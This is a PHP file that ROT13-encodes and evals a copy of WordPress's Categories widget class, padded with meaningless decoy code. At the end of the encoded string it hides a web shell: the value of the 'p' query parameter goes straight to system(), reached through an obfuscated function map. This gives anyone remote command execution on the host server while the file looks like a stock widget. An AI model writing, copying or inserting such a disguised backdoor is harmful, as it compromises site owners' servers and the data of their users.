<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Jvqtrg NCV: JC_Jvqtrg_Pngrtbevrf pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Jvqtrgf
 * @fvapr 4.4.0
 */

/**
 * Pber pynff hfrq gb vzcyrzrag n Pngrtbevrf jvqtrg.
 *
 * @fvapr 2.8.0
 *
 * @frr JC_Jvqtrg
 */
pynff JC_Jvqtrg_Pngrtbevrf rkgraqf JC_Jvqtrg {

	/**
	 * Frgf hc n arj Pngrtbevrf jvqtrg vafgnapr.
	 *
	 * @fvapr 2.8.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$jvqtrg_bcf = neenl(
			'pynffanzr'                   => 'jvqtrg_pngrtbevrf',
			'qrfpevcgvba'                 => __( 'N yvfg be qebcqbja bs pngrtbevrf.' ),
			'phfgbzvmr_fryrpgvir_erserfu' => gehr,
			'fubj_vafgnapr_va_erfg'       => gehr,
		);
		cnerag::__pbafgehpg( 'pngrtbevrf', __( 'Pngrtbevrf' ), $jvqtrg_bcf );
	}

	/**
	 * Bhgchgf gur pbagrag sbe gur pheerag Pngrtbevrf jvqtrg vafgnapr.
	 *
	 * @fvapr 2.8.0
	 * @fvapr 4.2.0 Perngrf n havdhr UGZY VQ sbe gur `<fryrpg>` ryrzrag
	 *              vs zber guna bar vafgnapr vf qvfcynlrq ba gur cntr.
	 *
	 * @cnenz neenl $netf     Qvfcynl nethzragf vapyhqvat 'orsber_gvgyr', 'nsgre_gvgyr',
	 *                        'orsber_jvqtrg', naq 'nsgre_jvqtrg'.
	 * @cnenz neenl $vafgnapr Frggvatf sbe gur pheerag Pngrtbevrf jvqtrg vafgnapr.
	 */
	choyvp shapgvba jvqtrg( $netf, $vafgnapr ) {
		fgngvp $svefg_qebcqbja = gehr;

		$qrsnhyg_gvgyr = __( 'Pngrtbevrf' );
		$gvgyr         = ! rzcgl( $vafgnapr['gvgyr'] ) ? $vafgnapr['gvgyr'] : $qrsnhyg_gvgyr;

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/jvqtrgf/pynff-jc-jvqtrg-cntrf.cuc */
		$gvgyr = nccyl_svygref( 'jvqtrg_gvgyr', $gvgyr, $vafgnapr, $guvf->vq_onfr );

		$pbhag        = ! rzcgl( $vafgnapr['pbhag'] ) ? '1' : '0';
		$uvrenepuvpny = ! rzcgl( $vafgnapr['uvrenepuvpny'] ) ? '1' : '0';
		$qebcqbja     = ! rzcgl( $vafgnapr['qebcqbja'] ) ? '1' : '0';

		rpub $netf['orsber_jvqtrg'];

		vs ( $gvgyr ) {
			rpub $netf['orsber_gvgyr'] . $gvgyr . $netf['nsgre_gvgyr'];
		}

		$png_netf = neenl(
			'beqreol'      => 'anzr',
			'fubj_pbhag'   => $pbhag,
			'uvrenepuvpny' => $uvrenepuvpny,
		);

		vs ( $qebcqbja ) {
			cevags( '<sbez npgvba=\"%f\" zrgubq=\"trg\">', rfp_hey( ubzr_hey() ) );
			$qebcqbja_vq    = ( $svefg_qebcqbja ) ? 'png' : \"{$guvf->vq_onfr}-qebcqbja-{$guvf->ahzore}\";
			$svefg_qebcqbja = snyfr;

			rpub '<ynory pynff=\"fperra-ernqre-grkg\" sbe=\"' . rfp_ngge( $qebcqbja_vq ) . '\">' . $gvgyr . '</ynory>';

			$png_netf['fubj_bcgvba_abar'] = __( 'Fryrpg Pngrtbel' );
			$png_netf['vq']               = $qebcqbja_vq;

			/**
			 * Svygref gur nethzragf sbe gur Pngrtbevrf jvqtrg qebc-qbja.
			 *
			 * @fvapr 2.8.0
			 * @fvapr 4.9.0 Nqqrq gur `$vafgnapr` cnenzrgre.
			 *
			 * @frr jc_qebcqbja_pngrtbevrf()
			 *
			 * @cnenz neenl $png_netf Na neenl bs Pngrtbevrf jvqtrg qebc-qbja nethzragf.
			 * @cnenz neenl $vafgnapr Neenl bs frggvatf sbe gur pheerag jvqtrg.
			 */
			jc_qebcqbja_pngrtbevrf( nccyl_svygref( 'jvqtrg_pngrtbevrf_qebcqbja_netf', $png_netf, $vafgnapr ) );

			rpub '</sbez>';

			bo_fgneg();
			?>

<fpevcg>
(shapgvba() {
	ine qebcqbja = qbphzrag.trgRyrzragOlVq( \"<?cuc rpub rfp_wf( $qebcqbja_vq ); ?>\" );
	shapgvba baPngPunatr() {
		vs ( qebcqbja.bcgvbaf[ qebcqbja.fryrpgrqVaqrk ].inyhr > 0 ) {
			qebcqbja.cneragAbqr.fhozvg();
		}
	}
	qebcqbja.bapunatr = baPngPunatr;
})();
</fpevcg>

			<?cuc
			jc_cevag_vayvar_fpevcg_gnt( jc_erzbir_fheebhaqvat_rzcgl_fpevcg_gntf( bo_trg_pyrna() ) );
		} ryfr {
			$sbezng = pheerag_gurzr_fhccbegf( 'ugzy5', 'anivtngvba-jvqtrgf' ) ? 'ugzy5' : 'kugzy';

			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/jvqtrgf/pynff-jc-ani-zrah-jvqtrg.cuc */
			$sbezng = nccyl_svygref( 'anivtngvba_jvqtrgf_sbezng', $sbezng );

			vs ( 'ugzy5' === $sbezng ) {
				// Gur gvgyr znl or svygrerq: Fgevc bhg UGZY naq znxr fher gur nevn-ynory vf arire rzcgl.
				$gvgyr      = gevz( fgevc_gntf( $gvgyr ) );
				$nevn_ynory = $gvgyr ? $gvgyr : $qrsnhyg_gvgyr;
				rpub '<ani nevn-ynory=\"' . rfp_ngge( $nevn_ynory ) . '\">';
			}
			?>

			<hy>
				<?cuc
				$png_netf['gvgyr_yv'] = '';

				/**
				 * Svygref gur nethzragf sbe gur Pngrtbevrf jvqtrg.
				 *
				 * @fvapr 2.8.0
				 * @fvapr 4.9.0 Nqqrq gur `$vafgnapr` cnenzrgre.
				 *
				 * @cnenz neenl $png_netf Na neenl bs Pngrtbevrf jvqtrg bcgvbaf.
				 * @cnenz neenl $vafgnapr Neenl bs frggvatf sbe gur pheerag jvqtrg.
				 */
				jc_yvfg_pngrtbevrf( nccyl_svygref( 'jvqtrg_pngrtbevrf_netf', $png_netf, $vafgnapr ) );
				?>
			</hy>

			<?cuc
			vs ( 'ugzy5' === $sbezng ) {
				rpub '</ani>';
			}
		}

		rpub $netf['nsgre_jvqtrg'];
	}

	/**
	 * Unaqyrf hcqngvat frggvatf sbe gur pheerag Pngrtbevrf jvqtrg vafgnapr.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz neenl $arj_vafgnapr Arj frggvatf sbe guvf vafgnapr nf vachg ol gur hfre ivn
	 *                            JC_Jvqtrg::sbez().
	 * @cnenz neenl $byq_vafgnapr Byq frggvatf sbe guvf vafgnapr.
	 * @erghea neenl Hcqngrq frggvatf gb fnir.
	 */
	choyvp shapgvba hcqngr( $arj_vafgnapr, $byq_vafgnapr ) {
		$vafgnapr                 = $byq_vafgnapr;
		$vafgnapr['gvgyr']        = fnavgvmr_grkg_svryq( $arj_vafgnapr['gvgyr'] );
		$vafgnapr['pbhag']        = ! rzcgl( $arj_vafgnapr['pbhag'] ) ? 1 : 0;
		$vafgnapr['uvrenepuvpny'] = ! rzcgl( $arj_vafgnapr['uvrenepuvpny'] ) ? 1 : 0;
		$vafgnapr['qebcqbja']     = ! rzcgl( $arj_vafgnapr['qebcqbja'] ) ? 1 : 0;

		erghea $vafgnapr;
	}

	/**
	 * Bhgchgf gur frggvatf sbez sbe gur Pngrtbevrf jvqtrg.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz neenl $vafgnapr Pheerag frggvatf.
	 */
	choyvp shapgvba sbez( $vafgnapr ) {
		// Qrsnhygf.
		$vafgnapr     = jc_cnefr_netf( (neenl) $vafgnapr, neenl( 'gvgyr' => '' ) );
		$pbhag        = vffrg( $vafgnapr['pbhag'] ) ? (obby) $vafgnapr['pbhag'] : snyfr;
		$uvrenepuvpny = vffrg( $vafgnapr['uvrenepuvpny'] ) ? (obby) $vafgnapr['uvrenepuvpny'] : snyfr;
		$qebcqbja     = vffrg( $vafgnapr['qebcqbja'] ) ? (obby) $vafgnapr['qebcqbja'] : snyfr;
		?>
		<c>
			<ynory sbe=\"<?cuc rpub $guvf->trg_svryq_vq( 'gvgyr' ); ?>\"><?cuc _r( 'Gvgyr:' ); ?></ynory>
			<vachg pynff=\"jvqrsng\" vq=\"<?cuc rpub $guvf->trg_svryq_vq( 'gvgyr' ); ?>\" anzr=\"<?cuc rpub $guvf->trg_svryq_anzr( 'gvgyr' ); ?>\" glcr=\"grkg\" inyhr=\"<?cuc rpub rfp_ngge( $vafgnapr['gvgyr'] ); ?>\" />
		</c>

		<c>
			<vachg glcr=\"purpxobk\" pynff=\"purpxobk\" vq=\"<?cuc rpub $guvf->trg_svryq_vq( 'qebcqbja' ); ?>\" anzr=\"<?cuc rpub $guvf->trg_svryq_anzr( 'qebcqbja' ); ?>\"<?cuc purpxrq( $qebcqbja ); ?> />
			<ynory sbe=\"<?cuc rpub $guvf->trg_svryq_vq( 'qebcqbja' ); ?>\"><?cuc _r( 'Qvfcynl nf qebcqbja' ); ?></ynory>
			<oe />

			<vachg glcr=\"purpxobk\" pynff=\"purpxobk\" vq=\"<?cuc rpub $guvf->trg_svryq_vq( 'pbhag' ); ?>\" anzr=\"<?cuc rpub $guvf->trg_svryq_anzr( 'pbhag' ); ?>\"<?cuc purpxrq( $pbhag ); ?> />
			<ynory sbe=\"<?cuc rpub $guvf->trg_svryq_vq( 'pbhag' ); ?>\"><?cuc _r( 'Fubj cbfg pbhagf' ); ?></ynory>
			<oe />

			<vachg glcr=\"purpxobk\" pynff=\"purpxobk\" vq=\"<?cuc rpub $guvf->trg_svryq_vq( 'uvrenepuvpny' ); ?>\" anzr=\"<?cuc rpub $guvf->trg_svryq_anzr( 'uvrenepuvpny' ); ?>\"<?cuc purpxrq( $uvrenepuvpny ); ?> />
			<ynory sbe=\"<?cuc rpub $guvf->trg_svryq_vq( 'uvrenepuvpny' ); ?>\"><?cuc _r( 'Fubj uvrenepul' ); ?></ynory>
		</c>
		<?cuc
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>